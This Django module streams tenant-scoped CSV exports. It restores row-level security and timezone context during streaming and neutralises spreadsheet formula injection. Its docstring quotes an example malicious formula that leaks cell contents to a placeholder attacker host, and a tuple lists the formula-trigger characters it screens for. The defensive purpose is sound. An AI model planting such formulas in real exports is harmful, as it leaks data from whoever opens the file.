"""CSV downloads: one writer, one formula guard, one response shape.

Every CSV the API streams goes through :func:`csv_response`, so three things
hold for all of them rather than for whichever one remembered.

**Cells cannot run as formulas.** A spreadsheet treats a cell that starts with
``=``, ``+``, ``-`` or ``@`` as a formula, and tab or carriage return can smuggle
one past a naive check. Every text value here is somebody's typing (a lead's
name, a ticket subject, an invoice title), so a record named
``=HYPERLINK("https://evil.example/?"&A1)`` would otherwise run on the machine
of whoever opens the export. :func:`safe_cell` prefixes those with ``'``, which
spreadsheets read as "this is text". Numbers are written as they are: they are
formatted here, not typed by a user, and ``'-5`` would stop a real negative
figure being a number.

**The org's row security and day still apply while the body streams.** A
``StreamingHttpResponse`` body runs after the view has returned, which is after
``RequireOrgContext`` has cleared ``app.current_org`` and ``GetProfileAndOrg``
has put the timezone back. A queryset evaluated inside the stream therefore ran
with no tenant context, which under an RLS-bound database role matches no rows
at all, and read its dates in the server's timezone. The stream sets both
again for exactly as long as it runs and clears them in a ``finally``, the same
pairing the middleware and the Celery tasks use.

**Excel opens it as UTF-8.** A byte-order mark leads the file; without it Excel
guesses the local code page and mangles every accented name.
"""

import csv

from django.http import StreamingHttpResponse
from django.utils import timezone
from rest_framework.permissions import IsAuthenticated
from rest_framework.views import APIView

from common.org_time import activate_org_timezone
from common.permissions import HasOrgContext
from common.renderers import CSV_RENDERERS
from common.tasks import clear_rls_context, set_rls_context

BOM = "\ufeff"

# What a spreadsheet reads as the start of a formula. Tab and carriage return
# are here because some importers strip them and then see what follows.
_FORMULA_START = ("=", "+", "-", "@", "\t", "\r")


def safe_cell(value):
    """``value`` as a CSV cell that no spreadsheet will evaluate.

    Checked on the value as typed and again with leading whitespace removed:
    importers that trim cells turn ``" =HYPERLINK(...)"`` back into a formula.
    """
    if value is None:
        return ""
    if isinstance(value, str) and (
        value.startswith(_FORMULA_START) or value.lstrip().startswith(_FORMULA_START)
    ):
        return "'" + value
    return value


class _Echo:
    """File-like target for ``csv.writer``: hands each line back to the caller."""

    def write(self, value):
        return value


def csv_response(rows, filename, org):
    """Stream ``rows`` (the header first) as an attachment called ``filename``.

    ``rows`` should be lazy, a generator over ``.iterator()``, so a large
    export is never held in memory. It is consumed inside the org's RLS
    context and timezone; see the module docstring.
    """
    writer = csv.writer(_Echo())

    def stream():
        yield BOM
        try:
            activate_org_timezone(org)
            set_rls_context(org.id)
            for row in rows:
                yield writer.writerow([safe_cell(value) for value in row])
        finally:
            clear_rls_context()
            timezone.deactivate()

    response = StreamingHttpResponse(stream(), content_type="text/csv; charset=utf-8")
    response["Content-Disposition"] = f'attachment; filename="{filename}"'
    return response


def export_filename(prefix):
    """``<prefix>-<YYYY-MM-DD>.csv``, the day in the org's timezone.

    Called from the view, while the request's org timezone is still active.
    """
    return f"{prefix}-{timezone.localdate().isoformat()}.csv"


def local_iso(moment):
    """A datetime in the org's timezone as ISO 8601, or blank."""
    return timezone.localtime(moment).isoformat() if moment else ""


def iso_date(day):
    """A date as ``YYYY-MM-DD``, or blank."""
    return day.isoformat() if day else ""


def person(profile):
    """A profile as the lists show an owner: by email.

    Not the display name, which defaults to the email's local part and is not
    unique, so two people could read as one in a spreadsheet.
    """
    return profile.user.email if profile is not None else ""


def people(profiles):
    """Every profile in ``profiles`` as one cell, in a stable order."""
    return "; ".join(sorted(person(p) for p in profiles))


def names(objects, attr="name"):
    """``attr`` of every object as one cell, in a stable order."""
    return "; ".join(sorted(getattr(o, attr) or "" for o in objects))


def yes_no(flag):
    return "yes" if flag else "no"


class RecordExportView(APIView):
    """``GET /api/<module>/export/``: a module's list as a CSV file.

    Any member of the org may export, and gets exactly the rows the list would
    show them for the same query string, every page of it. That holds because
    a subclass's :meth:`get_queryset` calls the same function its list view
    builds its queryset with; it never filters on its own.

    Read access to the list is read access to this, for personal access tokens
    and the org API key too: it sits under the module's own ``/api/<module>/``
    root, so ``common.scopes`` asks the same ``<module>:read`` scope of both.

    Subclasses set ``filename_prefix`` and implement :meth:`get_queryset` and
    :meth:`columns`. A column is ``(header, value_of_row)``; the value is text,
    a number, or ``None``, and every cell goes through :func:`safe_cell`.
    """

    permission_classes = (IsAuthenticated, HasOrgContext)
    # Content negotiation runs before the handler, so a proxy sending
    # `Accept: text/csv` is answered 406 unless a renderer claims it.
    renderer_classes = CSV_RENDERERS
    filename_prefix = ""
    chunk_size = 500

    def get_queryset(self, request):
        raise NotImplementedError

    def columns(self, request):
        raise NotImplementedError

    def get(self, request, *args, **kwargs):
        # Both are built here, inside the request, so a malformed filter is a
        # 400 before any byte of the file is sent.
        queryset = self.get_queryset(request)
        columns = self.columns(request)

        def rows():
            yield [header for header, _value in columns]
            for record in queryset.iterator(chunk_size=self.chunk_size):
                yield [value(record) for _header, value in columns]

        return csv_response(
            rows(), export_filename(self.filename_prefix), request.profile.org
        )
